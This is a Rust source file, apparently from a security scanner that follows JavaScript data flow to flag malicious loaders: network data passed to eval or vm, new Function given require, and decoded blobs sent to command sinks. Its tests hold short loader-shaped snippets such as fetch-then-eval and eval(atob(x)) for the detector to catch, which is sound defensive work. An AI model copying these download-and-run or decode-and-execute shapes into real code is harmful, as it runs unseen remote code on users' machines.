        let mut k = s;
        if self.is_id(k, "async") {
            k += 1;
        }
        if self.is_id(k, "function") {
            k += 1;
            if self.kind(k) == Some(Kind::Ident) {
                k += 1;
            }
            if !self.punct(k, b'(') {
                return None;
            }
            let close = self.partner(k)?;
            return Some(self.param_list(k, close));
        }
        let arrow =
            |p: usize| self.punct(p, b'=') && self.punct(p + 1, b'>') && self.lx.adjacent(p + 1);
        if self.punct(k, b'(') {
            let close = self.partner(k)?;
            return arrow(close + 1).then(|| self.param_list(k, close));
        }
        if self.kind(k) == Some(Kind::Ident) && arrow(k + 1) {
            return self.name(k).map(|n| vec![(n.into_owned(), k)]);
        }
        None
    }

    fn param_list(&self, open: usize, close: usize) -> Vec<Bound> {
        let mut names = Vec::new();
        let mut k = open + 1;
        while k < close {
            if let Some(name) = self.name(k) {
                let starts =
                    self.punct(k - 1, b'(') || self.punct(k - 1, b',') || self.punct(k - 1, b'.');
                if starts && names.len() < 64 {
                    names.push((name.into_owned(), k));
                }
            } else if self.is_open(k)
                && let Some(end) = self.partner(k)
            {
                if self.punct(k, b'{') || self.punct(k, b'[') {
                    names.extend(self.pattern_names(k, end));
                }
                k = end;
            }
            // A default value is skipped up to the next comma.
            if self.punct(k, b'=') && !self.punct(k + 1, b'>') {
                while k < close && !self.punct(k, b',') {
                    k = match self.partner(k).filter(|_| self.is_open(k)) {
                        Some(end) => end + 1,
                        None => k + 1,
                    };
                }
                continue;
            }
            k += 1;
        }
        names
    }

    fn is_open(&self, k: usize) -> bool {
        self.lx.is_open(k)
    }

    /// Callbacks given to a call whose callee chain carries taint get tainted
    /// parameters.
    fn callback_pass(&mut self) -> bool {
        let mut changed = false;
        for i in 1..self.n() {
            if !self.tick() {
                break;
            }
            if !self.punct(i, b'(') {
                continue;
            }
            let callee_ok = match self.kind(i - 1) {
                // `catch (e) {` is a clause, `.catch(f)` a call.
                Some(Kind::Ident) => {
                    self.prev_dot(i - 1) || !CONTROL.contains(&self.lx.raw(self.text, i - 1))
                }
                Some(Kind::Punct(b')' | b']')) => true,
                _ => false,
            };
            if !callee_ok {
                continue;
            }
            let Some(close) = self.partner(i) else {
                continue;
            };
            // Only calls that pass a function are worth a chain walk.
            let mut params: Vec<Vec<Bound>> = Vec::new();
            let mut s = i + 1;
            while s < close {
                if let Some(list) = self.function_params(s) {
                    params.push(list);
                }
                // To the next comma at this level.
                let mut k = s;
                while k < close && !self.punct(k, b',') {
                    k = match self.partner(k).filter(|_| self.is_open(k)) {
                        Some(end) => end + 1,
                        None => k + 1,
                    };
                }
                s = k + 1;
            }
            if params.is_empty() {
                continue;
            }
            let taint = self.chain_taint(i - 1);
            if taint.bits == 0 {
                continue;
            }
            for list in params {
                changed |= self.taint_names(&list, &taint);
            }
        }
        changed
    }

    /// `try { ...tainted... } catch (err) { ... }`: the error of a failed
    /// request carries the response.
    fn catch_pass(&mut self) -> bool {
        let mut changed = false;
        for i in 1..self.n() {
            if !self.tick() {
                break;
            }
            if !(self.is_id(i, "catch") && self.punct(i + 1, b'(') && self.punct(i - 1, b'}')) {
                continue;
            }
            let (Some(block_open), Some(close)) = (self.partner(i - 1), self.partner(i + 1)) else {
                continue;
            };
            if block_open == 0 || !self.is_id(block_open - 1, "try") {
                continue;
            }
            let taint = self.range_taint(block_open, i);
            if taint.bits == 0 {
                continue;
            }
            let mut names = self.param_list(i + 1, close);
            if names.is_empty() {
                names = self.pattern_names(i + 1, close);
            }
            changed |= self.taint_names(&names, &taint);
        }
        changed
    }

    // ------------------------------------------------------------ sinks

    /// The sink the identifier at `i` starts, as `(class, label, open paren)`.
    fn sink_at(&self, i: usize) -> Option<(SinkClass, String, usize)> {
        let name = self.name(i)?;
        let next = i + 1;
        let global_call = |k: usize| self.punct(k, b'(');
        let reference = self.is_reference(i);
        match &*name {
            "eval" if reference => {
                if global_call(next) {
                    return Some((SinkClass::Code, "eval".into(), next));
                }
                // `(0, eval)(x)` and `(eval)(x)`
                if self.punct(next, b')')
                    && self.punct(next + 1, b'(')
                    && i > 0
                    && (self.punct(i - 1, b',') || self.punct(i - 1, b'('))
                {
                    return Some((SinkClass::Code, "indirect eval".into(), next + 1));
                }
                // `eval.call(null, x)`
                if self.punct(next, b'.')
                    && self
                        .name(next + 1)
                        .is_some_and(|m| matches!(&*m, "call" | "apply" | "bind"))
                    && self.punct(next + 2, b'(')
                {
                    return Some((SinkClass::Code, "eval.call".into(), next + 2));
                }
                None
            }
            // `Function.constructor` is `Function` itself: `new Function.constructor(code)`
            // and `new (Function.constructor)(code)`.
            "Function"
                if reference
                    && self.punct(next, b'.')
                    && self.is_id(next + 1, "constructor")
                    && (self.punct(next + 2, b'(')
                        || (self.punct(next + 2, b')') && self.punct(next + 3, b'('))) =>
            {
                let open = if self.punct(next + 2, b'(') {
                    next + 2
                } else {
                    next + 3
                };
                Some((SinkClass::Code, "Function.constructor".into(), open))
            }
            "Function" if reference && global_call(next) => {
                let label = if i > 0 && self.is_id(i - 1, "new") {
                    "new Function"
                } else {
                    "Function"
                };
                Some((SinkClass::Code, label.into(), next))
            }
            "constructor" if self.prev_dot(i) && global_call(next) => {
                // `x.constructor.constructor(code)`
                (i >= 3 && self.is_id(i - 2, "constructor") && self.punct(i - 3, b'.'))
                    .then(|| (SinkClass::Code, "constructor.constructor".to_string(), next))
            }
            "runInThisContext" | "runInNewContext" | "runInContext" | "compileFunction"
            | "_compile"
                if global_call(next) =>
            {
                Some((SinkClass::Code, name.to_string(), next))
            }
            "Script"
                if self.prev_dot(i) && i >= 2 && self.is_id(i - 2, "vm") && global_call(next) =>
            {
                Some((SinkClass::Code, "vm.Script".into(), next))
            }
            "execSync" | "execFileSync" | "spawnSync" | "execFile" if global_call(next) => {
                Some((SinkClass::Command, name.to_string(), next))
            }
            "exec" | "spawn" if global_call(next) => {
                let bound = if self.prev_dot(i) {
                    i >= 2
                        && (self
                            .name(i - 2)
                            .is_some_and(|o| self.cp_alias.contains(&*o))
                            || self.is_child_process_call(i - 2))
                } else {
                    self.cp_fn.contains(&*name)
                };
                bound.then(|| (SinkClass::Command, name.to_string(), next))
            }
            other => {
                // An alias of a sink: `const run = eval; run(x)`.
                if reference && !self.prev_dot(i) && global_call(next) {
                    self.sink_alias
                        .get(other)
                        .map(|&class| (class, other.to_string(), next))
                } else {
                    None
                }
            }
        }
    }

    /// Token `k` is the `)` of `require("child_process")`.
    fn is_child_process_call(&self, k: usize) -> bool {
        self.punct(k, b')')
            && k >= 3
            && self.kind(k - 1) == Some(Kind::Str)
            && self.is_id(k - 3, "require")
            && self
                .str_val(k - 1)
                .is_some_and(|m| CHILD_PROCESS.contains(&m.as_str()))
    }

    /// `window["eval"](x)`, and the same with a name built at run time.
    fn computed_global_call(&self, i: usize) -> Option<(Option<String>, usize)> {
        if !(self.is_global_obj(i) || self.is_id(i, "this")) || !self.punct(i + 1, b'[') {
            return None;
        }
        let close = self.partner(i + 1)?;
        if !self.punct(close + 1, b'(') {
            return None;
        }
        let literal = (close == i + 3 && self.kind(i + 2) == Some(Kind::Str))
            .then(|| self.str_val(i + 2))
            .flatten();
        Some((literal, close + 1))
    }

    fn sink_pass(&mut self) {
        // The earlier passes may have spent their budget; the sinks are always
        // collected, with a budget of their own, so padding cannot hide one.
        let exhausted = self.over_budget;
        self.steps = 0;
        self.over_budget = false;
        let mut function_vars: HashMap<String, usize> = HashMap::new();
        let mut uncertain: Option<(usize, String)> = None;
        let first_net = (0..self.n()).find_map(|k| self.net_head(k));
        let mut sinks: Vec<(usize, SinkClass, String, usize)> = Vec::new();
        for i in 0..self.n() {
            if !self.tick() {
                break;
            }
            if self.kind(i) != Some(Kind::Ident) {
                continue;
            }
            if let Some((class, label, open)) = self.sink_at(i) {
                sinks.push((i, class, label, open));
            } else if let Some((literal, open)) = self.computed_global_call(i) {
                match literal.as_deref() {
                    Some("eval") => sinks.push((i, SinkClass::Code, "eval".into(), open)),
                    Some("Function") => sinks.push((i, SinkClass::Code, "Function".into(), open)),
                    Some(_) => {}
                    None => {
                        if uncertain.is_none() {
                            uncertain = Some((
                                i,
                                "a function is looked up on the global object by a name built at \
                                 run time"
                                    .to_string(),
                            ));
                        }
                    }
                }
            }
        }
        // Whether the file writes the address of a remote host anywhere.
        let remote_url = (0..self.n()).any(|k| {
            matches!(self.kind(k), Some(Kind::Str | Kind::Template))
                && self.lx.raw(self.text, k).contains("://")
        });
        let browser_only = self.browser_only();
        for (i, class, label, open) in sinks {
            let Some(close) = self.partner(open) else {
                continue;
            };
            // The code is the first argument of eval, vm and _compile; the rest are
            // options (a `cachedData` buffer is not code). Function takes it all.
            let code_end = if first_arg_only(&label) {
                self.first_arg_end(open, close)
            } else {
                close
            };
            let taint = self.range_taint(open + 1, code_end);
            // `Function("require", ...)` called with `require`.
            if class == SinkClass::Code
                && matches!(
                    label.as_str(),
                    "new Function" | "Function" | "Function.constructor"
                )
            {
                self.function_require(i, open, close, &mut function_vars);
            }
            if class == SinkClass::Code && taint.bits & NET != 0 {
                let mut reason = format!(
                    "`{label}` runs data that came from a network call ({}) in the same file: \
                     code is downloaded and run, which is how loaders work",
                    taint.net.as_deref().unwrap_or("network")
                );
                if !remote_url {
                    reason.push_str(
                        "; the file writes no URL (the address may be relative or come from \
                         elsewhere), which is how some honest test pages and tools do it, so \
                         the level is one lower",
                    );
                } else if browser_only {
                    reason.push_str(
                        "; the file is browser code (it uses window or document and no Node.js \
                         feature), where the browser limits what the code can do, so the level \
                         is one lower",
                    );
                }
                self.add(FoundKind::FetchEval, i, reason);
                if let Some(found) = self.found.last_mut() {
                    found.lowered = !remote_url || browser_only;
                }
            } else if taint.bits & BLOB != 0 {
                self.add(
                    FoundKind::Encoded,
                    i,
                    format!(
                        "`{label}` is given decoded data ({}): an encoded blob handed to a code or \
                         command sink hides what the code does",
                        taint.blob.as_deref().unwrap_or("encoded data")
                    ),
                );
            }
        }
        // A function made with `require` as a parameter and called later.
        if !function_vars.is_empty() {
            for k in 0..self.n() {
                if !self.tick() {
                    break;
                }
                let Some(name) = self.name(k) else { continue };
                let key = format!("{name}\u{0}{}", self.resolve(&name, k));
                let Some(&site) = function_vars.get(&key) else {
                    continue;
                };
                if self.prev_dot(k) {
                    continue;
                }
                let mut open = k + 1;
                if self.punct(open, b'.')
                    && self
                        .name(open + 1)
                        .is_some_and(|m| matches!(&*m, "call" | "apply"))
                {
                    open += 2;
                }
                if self.punct(open, b'(')
                    && let Some(close) = self.partner(open)
                    && (open + 1..close).any(|j| self.is_id(j, "require"))
                {
                    self.add(FoundKind::FunctionRequire, site, function_require_reason());
                }
            }
        }
        // What the check could not follow, when the file also uses the network.
        if let Some(net) = first_net {
            if let Some((i, why)) = uncertain {
                self.add(
                    FoundKind::Uncertain,
                    i,
                    format!(
                        "{why}, and this file makes network calls ({net}); the check cannot tell \
                         what is called, so review it by hand"
                    ),
                );
            }
            let cut = self
                .lx
                .problems
                .iter()
                .find(|p| p.swallows)
                .map(|p| (p.offset, p.what));
            if let Some((offset, what)) = cut {
                self.found.push(Found {
                    kind: FoundKind::Uncertain,
                    lowered: false,
                    start: offset.min(self.text.len().saturating_sub(1)),
                    end: offset.min(self.text.len()),
                    reason: format!(
                        "the file could not be read to the end ({what}) and it makes network \
                         calls ({net}); code after that point was not checked, so review it by hand"
                    ),
                });
            }
        }
        // A file cut short or too complex to follow is never called clean, with
        // or without network calls: the sink may be in the part not read.
        if self.lx.truncated {
            self.tail_scan();
        }
        if exhausted || self.over_budget || self.lx.truncated {
            self.found.push(Found {
                kind: if self.lx.truncated {
                    FoundKind::Truncated
                } else {
                    FoundKind::Uncertain
                },
                lowered: false,
                start: 0,
                end: 0,
                reason: "the file is too large or too complex to follow completely, so \
                         a loader in it may have been missed; review it by hand"
                    .to_string(),
            });
        }
    }

    /// Whether the file is browser code: it uses `window` or `document` and
    /// nothing that only Node.js has (`require`, `process`, `module.exports`,
    /// `__dirname`, a built-in module). Code that can read files and start
    /// programs is not limited by a browser, so it keeps the rule's level.
    fn browser_only(&self) -> bool {
        const NODE_MODULES: &[&str] = &[
            "fs",
            "path",
            "os",
            "child_process",
            "http",
            "https",
            "net",
            "crypto",
            "vm",
            "zlib",
            "stream",
            "util",
            "url",
            "module",
        ];
        let (mut dom, mut node) = (false, false);
        for k in 0..self.n() {
            match self.kind(k) {
                Some(Kind::Ident) if self.is_reference(k) => match self.lx.raw(self.text, k) {
                    "document" | "window" => dom = true,
                    "require" | "process" | "__dirname" | "__filename" | "exports" | "module" => {
                        node = true;
                    }
                    _ => {}
                },
                Some(Kind::Str) => {
                    if let Some(value) = self.str_val(k)
                        && (value.starts_with("node:") || NODE_MODULES.contains(&value.as_str()))
                    {
                        node = true;
                    }
                }
                _ => {}
            }
            if node {
                return false;
            }
        }
        dom
    }

    /// The part of a file past the token limit is not lexed; it is searched as
    /// text for the two shapes that need no data flow, so padding with a million
    /// statements cannot hide them.
    fn tail_scan(&mut self) {
        static FUNCTION_REQUIRE: LazyLock<Regex> = LazyLock::new(|| {
            Regex::new(r#"Function\s*\(\s*['"][^'"]{0,200}\brequire\b"#).expect("valid pattern")
        });
        static ENCODED: LazyLock<Regex> = LazyLock::new(|| {
            Regex::new(r"(?:eval|Function|execSync|exec)\s*\([^)]{0,200}\b(?:atob|Buffer\s*\.\s*from)\s*\(")
                .expect("valid pattern")
        });
        let from = self.lx.tokens.last().map_or(0, |t| t.end as usize);
        let tail = &self.text[from.min(self.text.len())..];
        if let Some(m) = FUNCTION_REQUIRE.find(tail) {
            self.found.push(Found {
                kind: FoundKind::FunctionRequire,
                lowered: false,
                start: from + m.start(),
                end: from + m.end(),
                reason: function_require_reason(),
            });
        }
        if let Some(m) = ENCODED.find(tail) {
            self.found.push(Found {
                kind: FoundKind::Encoded,
                lowered: false,
                start: from + m.start(),
                end: from + m.end(),
                reason: "decoded data (atob or Buffer.from) is given to a code or command sink, \
                         found by text in the part of the file past the token limit"
                    .to_string(),
            });
        }
    }

    fn function_require(
        &mut self,
        i: usize,
        open: usize,
        close: usize,
        vars: &mut HashMap<String, usize>,
    ) {
        // The first argument is a string that names `require` as a parameter.
        if self.kind(open + 1) != Some(Kind::Str) {
            return;
        }
        let Some(params) = self.str_val(open + 1) else {
            return;
        };
        if !params.split(',').any(|p| p.trim() == "require") {
            return;
        }
        // Called at once: `new Function("require", body)(require)`.
        if self.punct(close + 1, b'(')
            && let Some(call_close) = self.partner(close + 1)
        {
            if (close + 2..call_close).any(|j| self.is_id(j, "require")) {
                self.add(FoundKind::FunctionRequire, i, function_require_reason());
            }
            return;
        }
        // Kept in a variable: `const make = new Function("require", body);`
        // (the constructor may be in parentheses: `new (Function.constructor)(...)`).
        let mut before = i;
        if before > 0 && self.punct(before - 1, b'(') {
            before -= 1;
        }
        if before > 0 && self.is_id(before - 1, "new") {
            before -= 1;
        }
        if before >= 2
            && self.punct(before - 1, b'=')
            && let Some(name) = self.name(before - 2)
        {
            let scope = self.resolve(&name, before - 2);
            vars.insert(format!("{name}\u{0}{scope}"), i);
        }
    }

    fn run(mut self) -> Vec<Found> {
        self.compute_enclosing();
        self.collect_decls();
        self.bind_pass();
        for _ in 0..MAX_PASSES {
            let mut changed = self.assign_pass();
            changed |= self.function_pass();
            changed |= self.callback_pass();
            changed |= self.catch_pass();
            if !changed || self.over_budget {
                break;
            }
        }
        self.sink_pass();
        self.found.sort_by_key(|f| (f.start, f.end));
        self.found
            .dedup_by(|a, b| a.start == b.start && a.kind == b.kind);
        self.found
    }
}

/// Sinks whose first argument is the code and the rest are options.
fn first_arg_only(label: &str) -> bool {
    matches!(
        label,
        "eval"
            | "indirect eval"
            | "runInThisContext"
            | "runInNewContext"
            | "runInContext"
            | "compileFunction"
            | "_compile"
            | "vm.Script"
    )
}

fn function_require_reason() -> String {
    "`new Function(\"require\", ...)` is called with `require`: code built at run time gets the \
     module loader, which is the usual shape of a loader"
        .to_string()
}

/// Whether a string literal (raw, with its quotes) is an encoded blob: a long
/// base64 string with mixed case, or a run of escape sequences.
fn blob_literal(raw: &str) -> Option<&'static str> {
    let inner = raw.get(1..raw.len().saturating_sub(1))?;
    if inner.len() >= 64
        && inner
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_'))
        && inner.bytes().any(|b| b.is_ascii_uppercase())
        && inner.bytes().any(|b| b.is_ascii_lowercase())
        && inner
            .bytes()
            .any(|b| b.is_ascii_digit() || matches!(b, b'+' | b'/'))
    {
        return Some("a long base64 string");
    }
    // Byte escapes (`\x41`) are how a payload is spelled out; `\u` escapes are
    // also how text in another script is written, so they need many more.
    let bytes = inner.matches("\\x").count();
    let units = inner.matches("\\u").count();
    (bytes >= 16 || units >= 32).then_some("a string of escape sequences")
}

// ---------------------------------------------------------------- hits

pub(crate) fn hit(
    ctx: &Ctx<'_>,
    start: usize,
    end: usize,
    severity: Severity,
    reason: String,
) -> Hit {
    let text = ctx.text();
    let start = start.min(text.len());
    let end = end.clamp(start, text.len());
    Hit {
        line: ctx.line_of(start),
        severity,
        reason,
        span: (end > start).then_some(TextSpan(start..end)),
    }
}

fn flow_hits(ctx: &Ctx<'_>, wanted: &[(FoundKind, Severity)]) -> Vec<Hit> {
    ctx.js_flow()
        .iter()
        .filter_map(|found| {
            wanted
                .iter()
                .find(|(kind, _)| *kind == found.kind)
                .map(|&(_, severity)| {
                    let severity = if found.lowered {
                        severity.min(Severity::High)
                    } else {
                        severity
                    };
                    hit(ctx, found.start, found.end, severity, found.reason.clone())
                })
        })
        .collect()
}

/// Rule `run.js-fetch-eval`.
pub fn fetch_eval(ctx: &Ctx<'_>) -> Vec<Hit> {
    flow_hits(
        ctx,
        &[
            (FoundKind::FetchEval, ctx.base),
            (FoundKind::Uncertain, Severity::Medium),
            // A file cut at the token limit is never called clean: HIGH keeps it
            // a non-pass at the default threshold.
            (FoundKind::Truncated, Severity::High),
        ],
    )
}

/// Rule `run.js-function-require`.
pub fn function_require(ctx: &Ctx<'_>) -> Vec<Hit> {
    flow_hits(ctx, &[(FoundKind::FunctionRequire, ctx.base)])
}

/// Rule `obfuscation.encoded-payload-sink`.
pub fn encoded_payload(ctx: &Ctx<'_>) -> Vec<Hit> {
    flow_hits(ctx, &[(FoundKind::Encoded, ctx.base)])
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(text: &str) -> Vec<(FoundKind, String)> {
        flow(text)
            .into_iter()
            .map(|f| (f.kind, text[f.start..f.end].to_string()))
            .collect()
    }

    fn fetch_eval_count(text: &str) -> usize {
        kinds(text)
            .iter()
            .filter(|(k, _)| *k == FoundKind::FetchEval)
            .count()
    }

    #[test]
    fn a_response_awaited_into_a_variable_and_evaluated() {
        let text = "const r = await axios.get(u);\neval(r.data.cookie);";
        assert_eq!(fetch_eval_count(text), 1);
    }

    #[test]
    fn promise_callbacks_carry_the_response() {
        assert_eq!(
            fetch_eval_count("fetch(u).then(r => r.text()).then(code => eval(code));"),
            1
        );
        assert_eq!(
            fetch_eval_count(
                "axios.get(u).then(res=>res.data).catch(err=>{ eval(err.response.data); });"
            ),
            1
        );
    }

    #[test]
    fn a_node_stream_callback_chain_is_followed() {
        let text = "const https = require('https');\nhttps.get(u, (res) => { let b = ''; res.on('data', c => { b += c; }); res.on('end', () => { eval(b); }); });";
        assert_eq!(fetch_eval_count(text), 1);
    }

    #[test]
    fn the_function_constructor_and_vm_are_sinks() {
        assert_eq!(
            fetch_eval_count("const c = await (await fetch(u)).text(); new Function(c)();"),
            1
        );
        assert_eq!(
            fetch_eval_count("const c = await fetch(u); Function('return ' + c)();"),
            1
        );
        assert_eq!(
            fetch_eval_count("const c = await fetch(u); vm.runInNewContext(c);"),
            1
        );
        assert_eq!(
            fetch_eval_count("const c = await fetch(u); module._compile(c, 'x');"),
            1
        );
    }

    #[test]
    fn indirect_forms_are_sinks() {
        for sink in [
            "(0, eval)(c)",
            "window.eval(c)",
            "globalThis['eval'](c)",
            "eval.call(null, c)",
            "[].constructor.constructor(c)()",
            "\\u0065val(c)",
        ] {
            let text = format!("const c = await fetch(u);\n{sink};");
            assert_eq!(fetch_eval_count(&text), 1, "{sink}");
        }
        assert_eq!(
            fetch_eval_count("const c = await fetch(u); const run = eval; run(c);"),
            1
        );
    }

    #[test]
    fn words_in_comments_and_strings_are_not_calls() {
        let text = "// eval(r.data)\nconst s = 'eval(r.data)';\nconst r = await axios.get(u);\n/* eval(r.data) */";
        assert!(kinds(text).is_empty());
    }

    #[test]
    fn eval_without_network_data_is_not_this_rule() {
        assert_eq!(
            fetch_eval_count("const code = '1+1'; eval(code); axios.get(u);"),
            0
        );
        assert_eq!(
            fetch_eval_count("app.get('/x', (req, res) => { eval(req.body.x); });"),
            0
        );
        assert_eq!(
            fetch_eval_count("const r = await axios.get(u); JSON.parse(r.data); eval('1');"),
            0
        );
    }

    #[test]
    fn a_method_called_eval_on_another_object_is_not_a_sink() {
        assert_eq!(
            fetch_eval_count("const r = await fetch(u); page.eval(r);"),
            0
        );
    }

    #[test]
    fn taint_goes_through_returns_and_destructuring() {
        assert_eq!(
            fetch_eval_count(
                "async function get(){ const r = await axios.get(u); return r.data; }\nconst d = await get();\neval(d);"
            ),
            1
        );
        assert_eq!(
            fetch_eval_count("const { data } = await axios.get(u);\neval(data);"),
            1
        );
        assert_eq!(
            fetch_eval_count("let s = ''; s += (await axios.get(u)).data;\nnew Function(s)();"),
            1
        );
    }

    #[test]
    fn a_computed_name_on_the_global_object_is_reported_with_a_network_call() {
        let text = "axios.get(u).then(r => { global['ev' + 'al'](r.data); });";
        let found = kinds(text);
        assert!(
            found.iter().any(|(k, _)| *k == FoundKind::Uncertain),
            "{found:?}"
        );
        let alone = "global['ev' + 'al'](x);";
        assert!(kinds(alone).is_empty());
    }

    #[test]
    fn a_string_or_slash_the_lexer_does_not_understand_is_not_reported() {
        // JSX text has apostrophes and closing tags; they end at the line.
        let text = "axios.get(u);\nconst a = <p>don't</p>;\neval(x);";
        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
    }

    #[test]
    fn a_file_that_cannot_be_read_to_the_end_is_reported_with_a_network_call() {
        let text = "axios.get(u); eval(x);\nconst t = `never closed";
        assert!(kinds(text).iter().any(|(k, _)| *k == FoundKind::Uncertain));
        assert!(kinds("eval(x);\nconst t = `never closed").is_empty());
    }

    #[test]
    fn function_require_is_found_called_at_once_and_through_a_variable() {
        assert_eq!(
            kinds("const m = new Function('require', body)(require);")
                .iter()
                .filter(|(k, _)| *k == FoundKind::FunctionRequire)
                .count(),
            1
        );
        assert_eq!(
            kinds("const make = new Function('a, require', body);\nmake(1, require);")
                .iter()
                .filter(|(k, _)| *k == FoundKind::FunctionRequire)
                .count(),
            1
        );
        assert!(kinds("const m = new Function('x', body)(require);").is_empty());
        assert!(kinds("const m = new Function('require', body);").is_empty());
    }

    #[test]
    fn function_constructor_is_the_function_constructor() {
        for text in [
            "const s = (await axios.get(u)).data.cookie;\nconst h = new (Function.constructor)('require', s);\nh(require);",
            "const s = (await axios.get(u)).data.cookie;\nconst h = new Function.constructor('require', s);\nh(require);",
        ] {
            let found = kinds(text);
            assert!(
                found.iter().any(|(k, _)| *k == FoundKind::FetchEval),
                "{found:?}"
            );
            assert!(
                found.iter().any(|(k, _)| *k == FoundKind::FunctionRequire),
                "{found:?}"
            );
        }
        assert!(kinds("const h = new Function.constructor('x', 'return 1');").is_empty());
    }

    #[test]
    fn decoded_data_in_a_sink_is_an_encoded_payload() {
        for text in [
            "eval(atob(x));",
            "new Function(Buffer.from(x, 'base64').toString())();",
            "execSync(Buffer.from(x, 'hex').toString());",
            "const { exec } = require('child_process');\nexec(unescape(x));",
            "eval(String.fromCharCode(1, 2, 3, 4, 5, 6, 7, 8));",
        ] {
            assert_eq!(
                kinds(text)
                    .iter()
                    .filter(|(k, _)| *k == FoundKind::Encoded)
                    .count(),
                1,
                "{text}"
            );
        }
        // A few character codes are ordinary text; the regular expression method
        // of the same name is not a command.
        assert!(kinds("eval(String.fromCharCode(0x2028));").is_empty());
        assert!(kinds("const m = /a/.exec(atob(x));").is_empty());
        assert!(kinds("const logo = 'x'; execSync('git status');").is_empty());
    }

    #[test]
    fn a_long_base64_literal_given_to_a_sink_through_a_variable_counts() {
        let blob = "QUJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5QUJjZGVmZ2hpamtsbW5vcA==";
        let text = format!("const p = \"{blob}\";\neval(p);");
        assert_eq!(kinds(&text).len(), 1);
        assert!(kinds(&format!("const p = \"{blob}\";\nconsole.log(p);")).is_empty());
    }

    #[test]
    fn a_name_means_one_variable_at_a_time() {
        // `content` is network data in one function and a parameter in another.
        let text = "function a(u){ const content = axios.get(u); return content; }\n\
                    function b(content){ eval(content); }";
        assert_eq!(fetch_eval_count(text), 0);
        // The same function sees it.
        let text = "function a(u){ const content = axios.get(u); eval(content); }";
        assert_eq!(fetch_eval_count(text), 1);
        // A variable of the enclosing function is seen from a nested callback.
        let text = "function a(u){ let b = ''; https.get(u, res => { res.on('data', c => { b += c; }); \
                    res.on('end', () => { eval(b); }); }); }";
        assert_eq!(
            fetch_eval_count(&format!("const https = require('https');\n{text}")),
            1
        );
        // A parameter that shadows a tainted outer name is not tainted.
        let text = "const d = await axios.get(u);\nfunction f(d){ eval(d); }\nf('1');";
        assert_eq!(fetch_eval_count(text), 0);
    }

    #[test]
    fn only_the_first_argument_of_eval_and_vm_is_code() {
        let text = "const o = Buffer.from(x, 'base64');\nnew vm.Script('1', { cachedData: o });";
        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
        let text = "const c = await fetch(u);\nnew vm.Script('1', { cachedData: c });";
        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
        let text = "const c = await fetch(u);\nnew vm.Script(c, { filename: 'x' });";
        assert_eq!(fetch_eval_count(text), 1);
    }

    #[test]
    fn browser_code_is_one_level_lower_and_node_code_is_not() {
        let page = "fetch('https://a.example.invalid/a.js').then(r => r.text()).then(c => { eval(c); document.title = 'x'; });";
        assert!(flow(page)[0].lowered);
        let server = "const fs = require('fs');\nfetch('https://a.example.invalid/a.js').then(r => r.text()).then(c => { eval(c); document.title = 'x'; });";
        assert!(!flow(server)[0].lowered);
        let neither =
            "fetch('https://a.example.invalid/a.js').then(r => r.text()).then(c => { eval(c); });";
        assert!(!flow(neither)[0].lowered);
    }

    #[test]
    fn a_property_set_on_an_object_does_not_taint_the_object() {
        // `Module.prototype._compile = tainted` must not make `Module.wrap(...)`
        // tainted; the stored property itself still is.
        let text = "const c = await fetch(u);\nModule.prototype._compile = c;\nvm.runInNewContext(Module.wrap(1));";
        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
        let text = "const c = await fetch(u);\nthis.body = c;\neval(this.body);";
        assert_eq!(fetch_eval_count(text), 1);
        let text = "const c = await fetch(u);\nthis.body = c;\neval(this.other);";
        assert_eq!(fetch_eval_count(text), 0);
    }

    #[test]
    fn a_file_without_a_url_is_one_level_lower() {
        let relative = flow("const c = await fetch('/a.js').then(r => r.text());\neval(c);");
        assert!(relative[0].lowered);
        let absolute = flow(
            "const c = await fetch('https://a.example.invalid/a.js').then(r => r.text());\neval(c);",
        );
        assert!(!absolute[0].lowered);
    }

    #[test]
    fn a_division_is_not_read_as_the_start_of_a_regular_expression() {
        for body in [
            "n++ / eval(r.data) / 1;",
            "n-- / eval(r.data) / 1;",
            "o.in / eval(r.data) / 1;",
            "({}) / eval(r.data) / 1;",
            "x = {} / eval(r.data) / 1;",
        ] {
            let text = format!("const r = await fetch('https://a.example.invalid/a');\n{body}");
            assert_eq!(fetch_eval_count(&text), 1, "{body}");
        }
        let division = "a = b / c / d; x = y++ / 2;\neval('1');";
        assert!(kinds(division).is_empty());
    }

    #[test]
    fn padding_cannot_use_up_the_budget_before_a_sink() {
        let padding = format!("{}1;\n", "z=".repeat(500)).repeat(20);
        let text = format!("{padding}new Function('require', process.env.X)(require);");
        let found = kinds(&text);
        assert!(
            found
                .iter()
                .any(|(k, _)| matches!(k, FoundKind::FunctionRequire | FoundKind::Uncertain)),
            "{found:?}"
        );
        let pad = ";\n".repeat(super::super::js_lex::MAX_TOKENS + 100_000);
        let found = kinds(&format!("{pad}new Function('require', c)(require);"));
        assert!(
            found.iter().any(|(k, _)| *k == FoundKind::FunctionRequire),
            "{found:?}"
        );
        assert!(
            found.iter().any(|(k, _)| *k == FoundKind::Truncated),
            "{found:?}"
        );
        let found = kinds(&format!("{pad}eval(atob(blob));"));
        assert!(
            found.iter().any(|(k, _)| *k == FoundKind::Encoded),
            "{found:?}"
        );
    }

    #[test]
    fn a_failed_regular_expression_is_not_retried_at_every_slash() {
        let text = format!("eval(x);\na = {}", "/\\".repeat(300_000));
        let started = std::time::Instant::now();
        let _ = flow(&text);
        assert!(started.elapsed().as_secs() < 3, "{:?}", started.elapsed());
    }

    #[test]
    fn two_functions_with_the_same_variable_name_are_both_found() {
        let text = "function a(s){ const h = new Function('require', s); h(require); }\n\
                    function b(s){ const h = new Function('require', s); h(require); }";
        let n = kinds(text)
            .iter()
            .filter(|(k, _)| *k == FoundKind::FunctionRequire)
            .count();
        assert_eq!(n, 2);
    }

    #[test]
    fn a_huge_input_stays_fast_and_bounded() {
        let text = "a=b;".repeat(400_000) + "eval(c);";
        let started = std::time::Instant::now();
        let _ = flow(&text);
        assert!(started.elapsed().as_secs() < 10);
        let nested = "f(".repeat(50_000) + &")".repeat(50_000) + "; eval(x);";
        let _ = flow(&nested);
    }
}
